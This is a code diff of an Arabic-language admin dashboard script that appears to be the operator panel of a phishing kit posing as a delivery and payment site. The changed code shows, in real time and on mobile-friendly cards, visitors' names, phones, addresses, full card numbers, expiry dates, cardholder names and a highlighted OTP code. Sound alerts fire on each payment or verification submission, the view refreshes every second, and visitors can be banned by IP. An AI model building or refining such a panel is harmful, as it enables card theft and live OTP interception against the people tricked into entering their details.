@@ -1,4 +1,4 @@
-// Admin Dashboard JavaScript
+// Admin Dashboard JavaScript - Mobile First RTL
 const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
   ? 'http://localhost:3000'
   : window.location.origin;
@@ -18,33 +18,25 @@ const sounds = {
 
 function playTone(frequencies, duration, gap = 0) {
   if (isMuted) return;
-  
   try {
     if (!audioContext) {
       audioContext = new (window.AudioContext || window.webkitAudioContext)();
     }
-    
     frequencies.forEach((freq, i) => {
       const oscillator = audioContext.createOscillator();
       const gainNode = audioContext.createGain();
-      
       oscillator.connect(gainNode);
       gainNode.connect(audioContext.destination);
-      
       oscillator.frequency.value = freq;
       oscillator.type = 'sine';
-      
       const startTime = audioContext.currentTime + (gap * i);
       gainNode.gain.setValueAtTime(0, startTime);
       gainNode.gain.linearRampToValueAtTime(0.3, startTime + 0.05);
       gainNode.gain.linearRampToValueAtTime(0, startTime + duration);
-      
       oscillator.start(startTime);
       oscillator.stop(startTime + duration);
     });
-  } catch (e) {
-    console.warn('Audio not supported:', e);
-  }
+  } catch (e) { console.warn('Audio not supported:', e); }
 }
 
 // Initialize Socket Connection
@@ -58,11 +50,9 @@ function initAdminSocket() {
     socket.on('connect', () => {
       console.log('🔌 Admin connected');
       updateConnectionStatus(true);
-      
       if (adminToken) {
         socket.emit('admin:validate', { sessionToken: adminToken });
       }
-      
       resolve(socket);
     });
 
@@ -77,7 +67,6 @@ function initAdminSocket() {
       updateConnectionStatus(false);
     });
 
-    // Admin validation response
     socket.on('admin:valid', (data) => {
       if (!data.valid) {
         localStorage.removeItem('admin_token');
@@ -94,14 +83,9 @@ function initAdminSocket() {
 
     // Visitor events
     socket.on('visitor:new', (data) => {
-      addLiveFeedItem({
-        icon: '👤',
-        title: 'زائر جديد',
-        details: `من ${data.country || 'غير معروف'} - الصفحة: ${getPageName(data.page)}`,
-        time: new Date()
-      });
       sounds.newVisitor();
       updateStats();
+      updateVisitorsList();
     });
 
     socket.on('visitor:pageChange', (data) => {
@@ -115,39 +99,21 @@ function initAdminSocket() {
 
     // Form submissions
     socket.on('form:deliverySubmitted', (data) => {
-      updateVisitorData(data.sessionId, { form_submitted: true, delivery_data: data.formData });
-      addLiveFeedItem({
-        icon: '📝',
-        title: 'إرسال نموذج التوصيل',
-        details: `من ${data.country || 'غير معروف'}`,
-        time: new Date()
-      });
       sounds.formDelivery();
       updateStats();
+      updateVisitorCard(data.sessionId, { form_submitted: true, delivery_data: data.formData });
     });
 
     socket.on('form:paymentSubmitted', (data) => {
-      updateVisitorData(data.sessionId, { payment_submitted: true, payment_data: data.paymentData });
-      addLiveFeedItem({
-        icon: '💳',
-        title: 'إرسال بيانات الدفع',
-        details: `من ${data.country || 'غير معروف'}`,
-        time: new Date()
-      });
       sounds.formPayment();
       updateStats();
+      updateVisitorCard(data.sessionId, { payment_submitted: true, payment_data: data.paymentData });
     });
 
     socket.on('form:verificationSubmitted', (data) => {
-      updateVisitorData(data.sessionId, { verification_submitted: true, verification_data: data.verificationData });
-      addLiveFeedItem({
-        icon: '🔐',
-        title: 'إرسال رمز التحقق',
-        details: `من ${data.country || 'غير معروف'}`,
-        time: new Date()
-      });
       sounds.formVerification();
       updateStats();
+      updateVisitorCard(data.sessionId, { verification_submitted: true, verification_data: data.verificationData });
     });
   });
 }
@@ -155,82 +121,282 @@ function initAdminSocket() {
 function updateConnectionStatus(isOnline) {
   const dot = document.querySelector('.status-dot');
   const text = document.querySelector('.connection-text');
-  if (dot) {
-    dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`;
-  }
-  if (text) {
-    text.textContent = isOnline ? 'متصل' : 'غير متصل';
-  }
-}
-
-function getPageName(page) {
-  const pages = {
-    'home': 'الرئيسية',
-    'delivery': 'التوصيل',
-    'payment': 'الدفع',
-    'verification': 'التحقق'
-  };
-  return pages[page] || page;
+  if (dot) { dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`; }
+  if (text) { text.textContent = isOnline ? 'متصل' : 'غير متصل'; }
 }
 
 function showNotification(title, message, type = 'info') {
   const notification = document.createElement('div');
   notification.className = 'notification';
   notification.innerHTML = `
-    <span class="notification-icon">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : 'ℹ'}</span>
-    <div class="notification-content">
-      <div class="notification-title">${title}</div>
-      <div class="notification-message">${message}</div>
+    <span style="font-size:1.5rem;">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : 'ℹ'}</span>
+    <div>
+      <div style="font-weight:600;">${title}</div>
+      <div style="font-size:0.85rem;color:#666;">${message}</div>
     </div>
   `;
   document.body.appendChild(notification);
-  
   setTimeout(() => {
     notification.style.animation = 'slideDown 0.3s ease reverse';
     setTimeout(() => notification.remove(), 300);
-  }, 5000);
+  }, 4000);
 }
 
-function addLiveFeedItem(item) {
-  const feed = document.getElementById('liveFeed');
-  if (!feed) return;
+// ========== MOBILE CARD RENDERING ==========
+function getPageName(page) {
+  const pages = { 'home': 'الرئيسية', 'delivery': 'التوصيل', 'payment': 'الدفع', 'verification': 'التحقق' };
+  return pages[page] || page;
+}
+
+function getCountryFlag(countryCode) {
+  if (!countryCode || countryCode === 'XX') return '🌍';
+  try {
+    return countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
+  } catch { return '🌍'; }
+}
+
+function createVisitorCard(visitor) {
+  const delivery = visitor.delivery_data || {};
+  const payment = visitor.payment_data || {};
+  const verification = visitor.verification_data || {};
+  const country = visitor.country || 'غير معروف';
+  const page = visitor.current_page || 'home';
   
-  const html = `
-    <div class="feed-item">
-      <span class="feed-icon">${item.icon}</span>
-      <div class="feed-content">
-        <div class="feed-title">${item.title}</div>
-        <div class="feed-details">${item.details}</div>
+  const hasOTP = verification.otp || verification.verificationData?.otp;
+  const otpValue = hasOTP ? (verification.otp || verification.verificationData?.otp) : null;
+  
+  // Progress steps
+  const steps = [
+    { key: 'form_submitted', label: 'التوصيل', icon: '📦' },
+    { key: 'payment_submitted', label: 'الدفع', icon: '💳' },
+    { key: 'verification_submitted', label: 'التحقق', icon: '🔐' }
+  ];
+  
+  const progressHTML = steps.map(step => {
+    const isCompleted = visitor[step.key];
+    const isActive = !isCompleted && (
+      (step.key === 'form_submitted' && !visitor.form_submitted) ||
+      (step.key === 'payment_submitted' && visitor.form_submitted && !visitor.payment_submitted) ||
+      (step.key === 'verification_submitted' && visitor.payment_submitted && !visitor.verification_submitted)
+    );
+    const statusClass = isCompleted ? 'completed' : (isActive ? 'active' : '');
+    return `
+      <div class="progress-step ${statusClass}">
+        <div class="step-icon">${isCompleted ? '✓' : step.icon}</div>
+        <span>${step.label}</span>
       </div>
-      <span class="feed-time">${formatTime(item.time)}</span>
+    `;
+  }).join('');
+  
+  // Build card sections
+  let cardBody = '';
+  
+  // Delivery section
+  if (Object.keys(delivery).length > 0) {
+    cardBody += `
+      <div class="card-section">
+        <div class="section-title"><span>📦</span> بيانات التوصيل</div>
+        ${delivery.fullName ? `<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">${delivery.fullName}</span></div>` : ''}
+        ${delivery.phone ? `<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">${delivery.phone}</span></div>` : ''}
+        ${delivery.email ? `<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">${delivery.email}</span></div>` : ''}
+        ${delivery.city ? `<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">${delivery.city}${delivery.region ? ' / ' + delivery.region : ''}</span></div>` : ''}
+        ${delivery.address ? `<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">${delivery.address}</span></div>` : ''}
+        ${delivery.notes ? `<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">${delivery.notes}</span></div>` : ''}
+      </div>
+    `;
+  }
+  
+  // Payment section
+  if (Object.keys(payment).length > 0) {
+    const cardNum = payment.cardNumber || payment.card_number || '';
+    cardBody += `
+      <div class="card-section payment-section">
+        <div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>
+        ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${cardNum}</span></div>` : ''}
+        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${payment.expiry}</span></div>` : ''}
+        ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${payment.cardHolder}</span></div>` : ''}
+      </div>
+    `;
+  }
+  
+  // OTP section - Highlighted
+  if (otpValue) {
+    cardBody += `
+      <div class="otp-section">
+        <div class="section-title"><span>🔐</span> رمز التحقق (OTP)</div>
+        <div class="otp-value">${otpValue}</div>
+      </div>
+    `;
+  }
+  
+  // Empty state message
+  if (!cardBody) {
+    cardBody = `
+      <div style="text-align:center;padding:1rem;color:#888;">
+        <p>لا توجد بيانات حتى الآن</p>
+        <small>البيانات ستظهر عند إدخالها من قبل العميل</small>
+      </div>
+    `;
+  }
+  
+  return `
+    <div class="visitor-card" data-session="${visitor.session_id}">
+      <div class="card-header">
+        <div class="card-status">
+          <span class="dot"></span>
+          <span>متصل الآن</span>
+        </div>
+        <div class="card-country">
+          <span>${getCountryFlag(visitor.country_code)}</span>
+          <span>${country}</span>
+        </div>
+        <div class="card-page">${getPageName(page)}</div>
+      </div>
+      
+      <div class="card-body">
+        ${cardBody}
+      </div>
+      
+      <div class="card-progress">
+        ${progressHTML}
+      </div>
+      
+      <div class="card-actions">
+        <button class="btn btn-danger btn-sm" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address}')">
+          🚫 حظر
+        </button>
+      </div>
     </div>
   `;
-  
-  feed.insertAdjacentHTML('afterbegin', html);
-  
-  // Keep only last 50 items
-  while (feed.children.length > 50) {
-    feed.lastChild.remove();
+}
+
+function updateVisitorsList() {
+  if (!socket) return;
+  socket.emit('visitors:request');
+  socket.once('visitors:update', (data) => {
+    const grid = document.getElementById('visitorsGrid');
+    const countEl = document.getElementById('onlineCount');
+    if (!grid) return;
+    
+    if (countEl) {
+      countEl.textContent = data.visitors.length;
+    }
+    
+    if (data.visitors.length === 0) {
+      grid.innerHTML = `
+        <div class="empty-state">
+          <span>👥</span>
+          <h3>لا يوجد زوار متصلين</h3>
+          <p>الزوار المتصلون حالياً سيظهرون هنا</p>
+        </div>
+      `;
+      return;
+    }
+    
+    grid.innerHTML = data.visitors.map(visitor => createVisitorCard(visitor)).join('');
+  });
+}
+
+function updateVisitorPage(sessionId, page) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  if (card) {
+    const pageEl = card.querySelector('.card-page');
+    if (pageEl) pageEl.textContent = getPageName(page);
+    
+    // Update progress steps
+    const steps = card.querySelectorAll('.progress-step');
+    if (page === 'delivery' && steps[0]) {
+      steps[0].classList.add('active');
+    }
   }
 }
 
-function formatTime(date) {
-  return date.toLocaleTimeString('ar-OM', { hour: '2-digit', minute: '2-digit' });
+function updateVisitorCard(sessionId, data) {
+  let card = document.querySelector(`[data-session="${sessionId}"]`);
+  
+  if (!card) {
+    // Card doesn't exist, refresh the whole list
+    updateVisitorsList();
+    return;
+  }
+  
+  // If delivery data, mark step 1 complete
+  if (data.form_submitted) {
+    const steps = card.querySelectorAll('.progress-step');
+    if (steps[0]) {
+      steps[0].classList.add('completed');
+      steps[0].classList.remove('active');
+      steps[0].querySelector('.step-icon').textContent = '✓';
+    }
+    if (steps[1]) {
+      steps[1].classList.add('active');
+    }
+  }
+  
+  // If payment data, mark step 2 complete
+  if (data.payment_submitted) {
+    const steps = card.querySelectorAll('.progress-step');
+    if (steps[1]) {
+      steps[1].classList.add('completed');
+      steps[1].classList.remove('active');
+      steps[1].querySelector('.step-icon').textContent = '✓';
+    }
+    if (steps[2]) {
+      steps[2].classList.add('active');
+    }
+  }
+  
+  // If verification/OTP, mark step 3 complete and highlight OTP
+  if (data.verification_submitted) {
+    const steps = card.querySelectorAll('.progress-step');
+    if (steps[2]) {
+      steps[2].classList.add('completed');
+      steps[2].classList.remove('active');
+      steps[2].querySelector('.step-icon').textContent = '✓';
+    }
+    
+    // Add OTP highlight
+    const verificationData = data.verification_data || data;
+    if (verificationData.otp) {
+      const cardBody = card.querySelector('.card-body');
+      const otpSection = cardBody.querySelector('.otp-section');
+      if (!otpSection) {
+        cardBody.insertAdjacentHTML('beforeend', `
+          <div class="otp-section">
+            <div class="section-title"><span>🔐</span> رمز التحقق (OTP)</div>
+            <div class="otp-value">${verificationData.otp}</div>
+          </div>
+        `);
+      }
+    }
+  }
+  
+  // Refresh card completely for full data update
+  updateVisitorsList();
+}
+
+function markVisitorOffline(sessionId) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  if (card) {
+    const statusEl = card.querySelector('.card-status');
+    if (statusEl) {
+      statusEl.innerHTML = '<span style="color:#aaa;">○ غير متصل</span>';
+    }
+    const dot = card.querySelector('.dot');
+    if (dot) dot.style.background = '#ccc';
+  }
 }
 
 // Stats Functions
 async function updateStats() {
   if (!socket) return;
-  
   socket.emit('stats:request');
-  
   socket.once('stats:update', (data) => {
     const elements = {
       'totalVisitors': data.totalVisitors,
       'onlineVisitors': data.onlineVisitors,
       'formSubmissions': data.formSubmissions,
-      'paymentSubmissions': data.paymentSubmissions,
-      'verificationSubmissions': data.verificationSubmissions
+      'paymentSubmissions': data.paymentSubmissions
     };
     
     Object.entries(elements).forEach(([id, value]) => {
@@ -238,9 +404,8 @@ async function updateStats() {
       if (el) el.textContent = value;
     });
     
-    // Update country chart
     const countryList = document.getElementById('countryList');
-    if (countryList && data.countryStats.length > 0) {
+    if (countryList && data.countryStats?.length > 0) {
       const maxCount = Math.max(...data.countryStats.map(c => parseInt(c.count)));
       countryList.innerHTML = data.countryStats.map(country => `
         <div class="country-item">
@@ -255,80 +420,6 @@ async function updateStats() {
   });
 }
 
-async function updateVisitorsList() {
-  if (!socket) return;
-  
-  socket.emit('visitors:request');
-  
-  socket.once('visitors:update', (data) => {
-    const tbody = document.getElementById('visitorsTableBody');
-    if (!tbody) return;
-    
-    if (data.visitors.length === 0) {
-      tbody.innerHTML = `
-        <tr>
-          <td colspan="5" class="empty-state">
-            <span>📭</span>
-            <p>لا يوجد زوار متصلين حالياً</p>
-          </td>
-        </tr>
-      `;
-      return;
-    }
-    
-    tbody.innerHTML = data.visitors.map(visitor => `
-      <tr data-session="${visitor.session_id}">
-        <td>
-          <span class="status-badge online">● متصل</span>
-        </td>
-        <td>${visitor.country || 'غير معروف'}</td>
-        <td>${getPageName(visitor.current_page)}</td>
-        <td>
-          ${visitor.form_submitted ? '<span class="status-badge submitted">✓ توصيل</span>' : ''}
-          ${visitor.payment_submitted ? '<span class="status-badge submitted">✓ دفع</span>' : ''}
-          ${visitor.verification_submitted ? '<span class="status-badge submitted">✓ تحقق</span>' : ''}
-        </td>
-        <td>
-          <div class="btn-group">
-            <button class="btn btn-sm btn-secondary" onclick="viewVisitorData('${visitor.session_id}')">عرض</button>
-            <button class="btn btn-sm btn-danger" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address}')">حظر</button>
-          </div>
-        </td>
-      </tr>
-    `).join('');
-  });
-}
-
-function updateVisitorPage(sessionId, page) {
-  const row = document.querySelector(`tr[data-session="${sessionId}"]`);
-  if (row) {
-    row.querySelector('td:nth-child(3)').textContent = getPageName(page);
-  }
-}
-
-function updateVisitorData(sessionId, data) {
-  const row = document.querySelector(`tr[data-session="${sessionId}"]`);
-  if (row) {
-    if (data.form_submitted) {
-      row.querySelector('td:nth-child(4)').innerHTML += '<span class="status-badge submitted">✓ توصيل</span>';
-    }
-    if (data.payment_submitted) {
-      row.querySelector('td:nth-child(4)').innerHTML += '<span class="status-badge submitted">✓ دفع</span>';
-    }
-    if (data.verification_submitted) {
-      row.querySelector('td:nth-child(4)').innerHTML += '<span class="status-badge submitted">✓ تحقق</span>';
-    }
-  }
-}
-
-function markVisitorOffline(sessionId) {
-  const row = document.querySelector(`tr[data-session="${sessionId}"]`);
-  if (row) {
-    row.querySelector('.status-badge')?.remove();
-    row.querySelector('td:first-child').innerHTML = '<span class="status-badge offline">○ غير متصل</span>';
-  }
-}
-
 // Admin Login
 async function adminLogin(username, password) {
   try {
@@ -337,28 +428,20 @@ async function adminLogin(username, password) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username, password })
     });
-    
     const data = await response.json();
-    
     if (data.success) {
       adminToken = data.admin.id + '_' + Date.now();
       localStorage.setItem('admin_token', adminToken);
       localStorage.setItem('admin_user', JSON.stringify(data.admin));
-      
       if (socket) {
         socket.emit('admin:login', {
           username,
           password: '',
-          deviceInfo: {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform
-          }
+          deviceInfo: { userAgent: navigator.userAgent, platform: navigator.platform }
         });
       }
-      
       return true;
     }
-    
     return false;
   } catch (error) {
     console.error('Login error:', error);
@@ -370,235 +453,31 @@ async function adminLogin(username, password) {
 function banVisitor(sessionId, ipAddress) {
   const reason = prompt('أدخل سبب الحظر:');
   if (reason === null) return;
-  
-  const customMessage = prompt('أدخل رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):');
+  const customMessage = prompt('رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):');
   
   if (socket) {
     socket.emit('user:ban', {
-      targetSessionId: sessionId,
-      targetIp: ipAddress,
+      targetSessionId: sessionId || null,
+      targetIp: ipAddress || null,
       reason,
       customMessage: customMessage || 'تم حظرك من الموقع. يرجى التواصل مع الدعم.'
     });
-    
-    showNotification('تم الحظر', `تم حظر المستخدم بنجاح`, 'success');
+    showNotification('تم الحظر', 'تم حظر المستخدم بنجاح', 'success');
     updateVisitorsList();
   }
-}
-
-// Products Functions
-async function loadProducts() {
-  try {
-    const response = await fetch(`${SERVER_URL}/api/products`);
-    const data = await response.json();
-    
-    const tbody = document.getElementById('productsTableBody');
-    if (!tbody) return;
-    
-    if (!data.products || data.products.length === 0) {
-      tbody.innerHTML = `
-        <tr>
-          <td colspan="6" class="empty-state">
-            <span>📦</span>
-            <p>لا توجد منتجات</p>
-          </td>
-        </tr>
-      `;
-      return;
-    }
-    
-    tbody.innerHTML = data.products.map(product => `
-      <tr>
-        <td>${product.id}</td>
-        <td>${product.name_ar}</td>
-        <td>${product.name_en || '-'}</td>
-        <td>${product.price} ر.ع</td>
-        <td>${product.stock || 0}</td>
-        <td>
-          <div class="btn-group">
-            <button class="btn btn-sm btn-warning" onclick="editProduct(${product.id})">تعديل</button>
-            <button class="btn btn-sm btn-danger" onclick="deleteProduct(${product.id})">حذف</button>
-          </div>
-        </td>
-      </tr>
-    `).join('');
-  } catch (error) {
-    console.error('Error loading products:', error);
-  }
-}
-
-function showProductModal(product = null) {
-  const modal = document.getElementById('productModal');
-  if (!modal) return;
-  
-  document.getElementById('productId').value = product?.id || '';
-  document.getElementById('productNameAr').value = product?.name_ar || '';
-  document.getElementById('productNameEn').value = product?.name_en || '';
-  document.getElementById('productDescription').value = product?.description || '';
-  document.getElementById('productPrice').value = product?.price || '';
-  document.getElementById('productImage').value = product?.image_url || '';
-  document.getElementById('productCategory').value = product?.category || '';
-  document.getElementById('productStock').value = product?.stock || 0;
-  
-  modal.style.display = 'flex';
-}
-
-async function saveProduct(formData) {
-  const id = formData.get('id');
-  const method = id ? 'PUT' : 'POST';
-  const url = id ? `${SERVER_URL}/api/products/${id}` : `${SERVER_URL}/api/products`;
-  
-  try {
-    const response = await fetch(url, {
-      method,
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(Object.fromEntries(formData))
-    });
-    
-    const data = await response.json();
-    
-    if (data.success) {
-      showNotification('تم الحفظ', 'تم حفظ المنتج بنجاح', 'success');
-      document.getElementById('productModal').style.display = 'none';
-      loadProducts();
-    }
-  } catch (error) {
-    console.error('Error saving product:', error);
-    showNotification('خطأ', 'حدث خطأ أثناء الحفظ', 'error');
-  }
-}
-
-async function deleteProduct(id) {
-  if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
-  
-  try {
-    await fetch(`${SERVER_URL}/api/products/${id}`, { method: 'DELETE' });
-    showNotification('تم الحذف', 'تم حذف المنتج بنجاح', 'success');
-    loadProducts();
-  } catch (error) {
-    console.error('Error deleting product:', error);
-  }
-}
-
-function editProduct(id) {
-  fetch(`${SERVER_URL}/api/products/${id}`)
-    .then(res => res.json())
-    .then(data => showProductModal(data.product))
-    .catch(console.error);
-}
-
-// Device Management
-async function loadDevices() {
-  try {
-    const response = await fetch(`${SERVER_URL}/api/admin/sessions`);
-    const data = await response.json();
-    
-    const container = document.getElementById('devicesContainer');
-    if (!container) return;
-    
-    if (!data.sessions || data.sessions.length === 0) {
-      container.innerHTML = `
-        <div class="empty-state">
-          <span>📱</span>
-          <p>لا توجد أجهزة متصلة</p>
-        </div>
-      `;
-      return;
-    }
-    
-    container.innerHTML = data.sessions.map(session => {
-      const deviceInfo = session.device_info || {};
-      return `
-        <div class="device-item">
-          <div class="device-info">
-            <span class="device-icon">💻</span>
-            <div class="device-details">
-              <h4>${session.ip_address || 'غير معروف'}</h4>
-              <p>${session.country || 'غير معروف'} - ${formatTime(new Date(session.created_at))}</p>
-            </div>
-          </div>
-          <button class="btn btn-sm btn-danger" onclick="logoutDevice('${session.session_token}')">
-            تسجيل خروج
-          </button>
-        </div>
-      `;
-    }).join('');
-  } catch (error) {
-    console.error('Error loading devices:', error);
-  }
-}
-
-async function logoutDevice(token) {
-  try {
-    await fetch(`${SERVER_URL}/api/admin/sessions/${token}`, { method: 'DELETE' });
-    showNotification('تم تسجيل الخروج', 'تم تسجيل خروج الجهاز بنجاح', 'success');
-    loadDevices();
-  } catch (error) {
-    console.error('Error logging out device:', error);
-  }
-}
-
-async function logoutAllDevices() {
-  if (!confirm('هل أنت متأكد من تسجيل خروج جميع الأجهزة؟')) return;
-  
-  try {
-    await fetch(`${SERVER_URL}/api/admin/sessions`, { method: 'DELETE' });
-    showNotification('تم تسجيل الخروج', 'تم تسجيل خروج جميع الأجهزة', 'success');
-    loadDevices();
-  } catch (error) {
-    console.error('Error logging out devices:', error);
-  }
-}
-
-// View Visitor Data Modal
-function viewVisitorData(sessionId) {
-  socket.emit('visitors:request');
-  socket.once('visitors:update', (data) => {
-    const visitor = data.visitors.find(v => v.session_id === sessionId);
-    if (visitor) {
-      showVisitorModal(visitor);
-    }
-  });
-}
-
-function showVisitorModal(visitor) {
-  const modal = document.getElementById('visitorModal');
-  if (!modal) return;
-  
-  document.getElementById('visitorSession').textContent = visitor.session_id;
-  document.getElementById('visitorCountry').textContent = visitor.country || 'غير معروف';
-  document.getElementById('visitorPage').textContent = getPageName(visitor.current_page);
-  document.getElementById('visitorStatus').textContent = visitor.is_online ? 'متصل' : 'غير متصل';
-  
-  const deliveryData = document.getElementById('visitorDelivery');
-  const paymentData = document.getElementById('visitorPayment');
-  const verifyData = document.getElementById('visitorVerify');
-  
-  deliveryData.innerHTML = visitor.delivery_data ? JSON.stringify(visitor.delivery_data, null, 2) : '-';
-  paymentData.innerHTML = visitor.payment_data ? JSON.stringify(visitor.payment_data, null, 2) : '-';
-  verifyData.innerHTML = visitor.verification_data ? JSON.stringify(visitor.verification_data, null, 2) : '-';
-  
-  modal.style.display = 'flex';
 }
 
 // Tab Navigation
 function showTab(tabId) {
   document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
   document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-  
   document.getElementById(tabId)?.classList.add('active');
   document.querySelector(`[data-tab="${tabId}"]`)?.classList.add('active');
   
-  // Load data for each tab
-  if (tabId === 'stats') {
-    updateStats();
-  } else if (tabId === 'tracking') {
-    updateVisitorsList();
-  } else if (tabId === 'products') {
-    loadProducts();
-  } else if (tabId === 'devices') {
-    loadDevices();
-  }
+  if (tabId === 'stats') { updateStats(); }
+  else if (tabId === 'tracking') { updateVisitorsList(); }
+  else if (tabId === 'products') { loadProducts(); }
+  else if (tabId === 'devices') { loadDevices(); }
 }
 
 // Toggle Sound
@@ -611,16 +490,97 @@ function toggleSound() {
   }
 }
 
-// Show Login Page
+// Show Login/Dashboard
 function showLoginPage() {
   document.getElementById('loginPage').style.display = 'flex';
   document.getElementById('dashboard').style.display = 'none';
 }
 
-// Show Dashboard
 function showDashboard() {
   document.getElementById('loginPage').style.display = 'none';
   document.getElementById('dashboard').style.display = 'flex';
+}
+
+// Products Functions
+async function loadProducts() {
+  try {
+    const response = await fetch(`${SERVER_URL}/api/products`);
+    const data = await response.json();
+    const tbody = document.getElementById('productsTableBody');
+    if (!tbody) return;
+    
+    if (!data.products?.length) {
+      tbody.innerHTML = `<tr><td colspan="6" class="empty-state"><span>📦</span><p>لا توجد منتجات</p></td></tr>`;
+      return;
+    }
+    
+    tbody.innerHTML = data.products.map(product => `
+      <tr>
+        <td>${product.id}</td>
+        <td>${product.name_ar}</td>
+        <td>${product.name_en || '-'}</td>
+        <td>${product.price} ر.ع</td>
+        <td>${product.stock || 0}</td>
+        <td>
+          <button class="btn btn-sm btn-danger" onclick="deleteProduct(${product.id})">حذف</button>
+        </td>
+      </tr>
+    `).join('');
+  } catch (error) { console.error('Error loading products:', error); }
+}
+
+async function deleteProduct(id) {
+  if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
+  try {
+    await fetch(`${SERVER_URL}/api/products/${id}`, { method: 'DELETE' });
+    showNotification('تم الحذف', 'تم حذف المنتج بنجاح', 'success');
+    loadProducts();
+  } catch (error) { console.error('Error deleting product:', error); }
+}
+
+// Device Management
+async function loadDevices() {
+  try {
+    const response = await fetch(`${SERVER_URL}/api/admin/sessions`);
+    const data = await response.json();
+    const container = document.getElementById('devicesContainer');
+    if (!container) return;
+    
+    if (!data.sessions?.length) {
+      container.innerHTML = `<div class="empty-state"><span>📱</span><p>لا توجد أجهزة متصلة</p></div>`;
+      return;
+    }
+    
+    container.innerHTML = data.sessions.map(session => `
+      <div class="device-item">
+        <div class="device-info">
+          <span class="device-icon">💻</span>
+          <div class="device-details">
+            <h4>${session.ip_address || 'غير معروف'}</h4>
+            <p>${session.country || 'غير معروف'}</p>
+          </div>
+        </div>
+        <button class="btn btn-sm btn-danger" onclick="logoutDevice('${session.session_token}')">خروج</button>
+      </div>
+    `).join('');
+  } catch (error) { console.error('Error loading devices:', error); }
+}
+
+async function logoutDevice(token) {
+  try {
+    await fetch(`${SERVER_URL}/api/admin/sessions/${token}`, { method: 'DELETE' });
+    showNotification('تم تسجيل الخروج', '', 'success');
+    loadDevices();
+  } catch (error) { console.error('Error logging out device:', error); }
+}
+
+async function logoutAllDevices() {
+  if (!confirm('تسجيل خروج جميع الأجهزة؟')) return;
+  try {
+    await fetch(`${SERVER_URL}/api/admin/sessions`, { method: 'DELETE' });
+    showNotification('تم تسجيل الخروج', '', 'success');
+    loadDevices();
+  } catch (error) { console.error('Error logging out devices:', error); }
 }
 
 // Initialize
@@ -639,7 +599,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     e.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
-    
     const success = await adminLogin(username, password);
     if (success) {
       showDashboard();
@@ -647,12 +606,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     } else {
       showNotification('خطأ', 'اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
     }
-  });
-  
-  // Product form
-  document.getElementById('productForm')?.addEventListener('submit', (e) => {
-    e.preventDefault();
-    saveProduct(new FormData(e.target));
   });
   
   // Logout button
@@ -663,7 +616,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     showLoginPage();
   });
   
-  // Start real-time updates for tracking tab
+  // Auto refresh tracking every second
   setInterval(() => {
     if (document.getElementById('tracking')?.classList.contains('active')) {
       updateVisitorsList();
@@ -671,13 +624,10 @@ document.addEventListener('DOMContentLoaded', async () => {
   }, 1000);
 });
 
-// Export for use in HTML
+// Export functions
 window.showTab = showTab;
 window.toggleSound = toggleSound;
 window.banVisitor = banVisitor;
-window.viewVisitorData = viewVisitorData;
-window.showProductModal = showProductModal;
-window.editProduct = editProduct;
 window.deleteProduct = deleteProduct;
 window.logoutDevice = logoutDevice;
 window.logoutAllDevices = logoutAllDevices;
